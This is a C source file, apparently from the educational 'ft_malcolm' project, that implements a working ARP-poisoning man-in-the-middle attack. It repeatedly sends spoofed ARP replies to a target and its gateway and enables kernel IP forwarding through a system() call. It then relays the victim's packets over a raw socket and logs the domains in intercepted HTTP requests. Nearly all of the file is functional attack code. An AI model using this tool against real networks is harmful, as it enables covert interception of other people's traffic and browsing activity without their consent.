#include "ft_malcolm.h"
#include "libft.h"
#include "packet_utils.h"
#include <errno.h>
#include <net/if.h>
#include <stdint.h>
#include <stdio.h>
atomic_ulong g_http_packets = 0;

void analyze_http_traffic(const unsigned char *packet, ssize_t size)
{
	// 1) Sanity check global
	if (size < (ETH_HDR_LEN + IP_HDR_MIN_LEN + TCP_HDR_MIN_LEN)
		|| !is_ip_packet(packet))
		return;

	// 2) IP header
	const unsigned char *ip_header = pkt_ip_header(packet);
	uint8_t				 ihl = ip_header[0] & 0x0F;
	uint8_t				 ip_header_len = ihl * 4;
	if (ip_header_len < IP_HDR_MIN_LEN
		|| size < (ETH_HDR_LEN + ip_header_len + TCP_HDR_MIN_LEN))
		return;

	uint8_t ip_protocol = ip_header[9];
	if (ip_protocol != 6) // TCP only
		return;

	// 3) TCP header
	const unsigned char *tcp_header = ip_header + ip_header_len;
	uint16_t			 src_port = (tcp_header[0] << 8) | tcp_header[1];
	uint16_t			 dst_port = (tcp_header[2] << 8) | tcp_header[3];

	// HTTP only
	if (!is_http_port(src_port) && !is_http_port(dst_port))
		return;

	uint8_t data_offset = (tcp_header[12] & 0xF0) >> 4;
	uint8_t tcp_header_len = data_offset * 4;
	if (tcp_header_len < TCP_HDR_MIN_LEN
		|| size < (ETH_HDR_LEN + ip_header_len + tcp_header_len))
		return;

	const unsigned char *payload = tcp_header + tcp_header_len;
	int payload_len = size - ETH_HDR_LEN - ip_header_len - tcp_header_len;
	if (payload_len <= 10)
		return;

	const char *p = (const char *)payload;
	if (!((payload_len > 4 && !ft_strncmp(p, "GET ", 4))
		  || (payload_len > 5 && !ft_strncmp(p, "POST ", 5))
		  || (payload_len > 5 && !ft_strncmp(p, "HEAD ", 5))
		  || (payload_len > 4 && !ft_strncmp(p, "PUT ", 4))
		  || (payload_len > 7 && !ft_strncmp(p, "OPTIONS", 7))))
	{
		return;
	}

	char domain[256] = "unknown";
	extract_domain_from_http(payload, payload_len, domain);

	static char	  last_domain[256] = "";
	static time_t last_time = 0;
	time_t		  now = time(NULL);

	if (ft_strcmp(domain, last_domain) != 0 || (now - last_time) > 2)
	{
		atomic_fetch_add(&g_http_packets, 1);
		printf(COLOR_CYAN "[HTTP] %s\n" COLOR_RESET, domain);

		ft_strlcpy(last_domain, domain, sizeof(last_domain));
		last_time = now;
	}
}

static void update_packet_for_forwarding(unsigned char *buffer,
										 const char *dst_ip_str, t_args *args)
{
	sscanf(dst_ip_str, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &buffer[0], &buffer[1],
		   &buffer[2], &buffer[3], &buffer[4], &buffer[5]);

	// Always set source MAC to our attacker MAC (we are the forwarder)
	sscanf(args->source_mac, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &buffer[6],
		   &buffer[7], &buffer[8], &buffer[9], &buffer[10], &buffer[11]);
}

static void forward_packet(int sockfd, unsigned char *buffer, ssize_t bytes,
						   t_forward_args *fargs)
{
	struct sockaddr_ll sll;
	ft_memset(&sll, 0, sizeof(struct sockaddr_ll));
	sll.sll_family = AF_PACKET;
	sll.sll_ifindex = fargs->ifindex;
	sll.sll_halen = ETH_ALEN;
	ft_memcpy(sll.sll_addr, buffer, 6); // destination MAC

	sendto(sockfd, buffer, bytes, 0, (struct sockaddr *)&sll, sizeof(sll));
}

static void *traffic_forwarding_thread(void *args)
{
	t_forward_args *fargs = (t_forward_args *)args;
	unsigned char	buffer[PACKET_BUF_SIZE];
	ssize_t			bytes;

	printf(COLOR_GREEN "[MITM] Traffic forwarding started\n" COLOR_RESET);

	while (!atomic_load(&g_stop))
	{
		bytes = recvfrom(fargs->sockfd, buffer, sizeof(buffer), 0, NULL, NULL);
		if (bytes < 0)
		{
			if (errno == EAGAIN || errno == EWOULDBLOCK || errno == EINTR)
				continue; // Timeout or interrupted, check g_stop again
			perror("recvfrom in forwarding thread");
			continue;
		}

		// convert attacker MAC string to bytes for comparison (mac with sscanf)
		uint8_t source_mac_binary[6];

		sscanf(fargs->args->source_mac, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
			   &source_mac_binary[0], &source_mac_binary[1],
			   &source_mac_binary[2], &source_mac_binary[3],
			   &source_mac_binary[4], &source_mac_binary[5]);

		const unsigned char *eth_src_mac = pkt_eth_src_mac(buffer);

		if (ft_memcmp(eth_src_mac, source_mac_binary, 6) == 0)
			// Packet sent by attacker(us), ignore (kernel loopback)
			continue;

		uint16_t ethertype;
		ethertype = pkt_get_ethertype(buffer);

		// Handle IP packets for MITM analysis and forwarding
		if (ethertype == ETH_P_IP)
		{
			const unsigned char *eth_src_ip_tmp = pkt_ip_src_ip(buffer);
			const unsigned char *eth_dst_ip_tmp = pkt_ip_target_ip(buffer);

			// convert src and destination IPs to strings for comparison (ip
			// with inet_ntop)
			char eth_src_ip[INET_ADDRSTRLEN];
			char eth_dst_ip[INET_ADDRSTRLEN];
			inet_ntop(AF_INET, eth_src_ip_tmp, eth_src_ip, sizeof(eth_src_ip));
			inet_ntop(AF_INET, eth_dst_ip_tmp, eth_dst_ip, sizeof(eth_dst_ip));

			uint8_t target_mac_binary[6];
			sscanf(fargs->args->target_mac, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
				   &target_mac_binary[0], &target_mac_binary[1],
				   &target_mac_binary[2], &target_mac_binary[3],
				   &target_mac_binary[4], &target_mac_binary[5]);

			if (ft_memcmp(eth_src_mac, target_mac_binary, 6) == 0)
				analyze_http_traffic(buffer, bytes);

			// Forward ALL traffic from our target (for internet access)
			if (ft_strcmp(eth_src_ip, fargs->args->target_ip) == 0)
			{
				// Traffic FROM target - forward to appropriate destination
				update_packet_for_forwarding(buffer, eth_dst_ip, fargs->args);
				forward_packet(fargs->sockfd, buffer, bytes, fargs);
			}
			// Forward traffic TO our target
			else if (ft_strcmp(eth_dst_ip, fargs->args->target_ip) == 0)
			{
				// Traffic TO target - forward to target
				update_packet_for_forwarding(buffer, eth_dst_ip, fargs->args);
				forward_packet(fargs->sockfd, buffer, bytes, fargs);
			}
		}
	}
	return NULL;
}

void perform_mitm_attack(int sockfd, t_args *args)
{
	unsigned int   ifindex = if_nametoindex(args->ifname);
	t_forward_args fargs = { sockfd, args, ifindex };

	// Display initial setup info
	printf(COLOR_GREEN "[MITM] Attack started\n" COLOR_RESET);
	printf(
		COLOR_CYAN "Target: " COLOR_RESET "%s " COLOR_YELLOW "(%s)" COLOR_RESET
				   " | " COLOR_CYAN "Gateway: " COLOR_RESET "%s " COLOR_YELLOW
				   "(%s)\n" COLOR_RESET,
		args->target_ip, args->target_mac, args->source_ip, args->spoofed_mac);
	printf(COLOR_YELLOW "Press Ctrl+C to stop\n" COLOR_RESET);
	printf(COLOR_BLUE "[Info] ARP poisoning may take time to become "
					  "effective...\n");
	printf("[Info] Please do a flush if you want to see immediate results: ip "
		   "neigh flush all\n" COLOR_RESET);

	// Enable IP forwarding
	system("echo 1 > /proc/sys/net/ipv4/ip_forward 2>/dev/null");

	struct timeval tv;
	tv.tv_sec = 1;
	tv.tv_usec = 0;

	if (setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv)) < 0)
	{
		perror("setsockopt(SO_RCVTIMEO)");
		return;
	}

	// Start traffic forwarding thread
	if (pthread_create(&g_forward_thread, NULL, traffic_forwarding_thread,
					   &fargs)
		!= 0)
	{
		perror("pthread_create");
		return;
	}

	// Main ARP poisoning loop
	int	   cycle_count = 0;
	time_t last_stats = time(NULL);
	bool   print_verbose = true;

	while (!atomic_load(&g_stop))
	{
		// Send poison packets
		send_arp_reply(sockfd, args, args->source_mac, args->source_ip,
					   args->target_mac, args->target_ip, print_verbose);
		send_arp_reply(sockfd, args, args->source_mac, args->target_ip,
					   args->spoofed_mac, args->source_ip, print_verbose);
		cycle_count++;

		// Show minimal progress every minute
		time_t now = time(NULL);
		if (now - last_stats >= 60)
		{
			print_verbose = true;
			printf(
				COLOR_YELLOW
				"[MITM] Running... (%d cycles, %d packets sent)\n" COLOR_RESET,
				cycle_count, cycle_count * 2);
			print_traffic_summary();
			last_stats = now;
		}
		else
			print_verbose = false;

		usleep(250000);
	}

	printf(COLOR_RED
		   "\n[MITM] Stopping attack and restoring network...\n" COLOR_RESET);
	pthread_join(g_forward_thread, NULL);
}
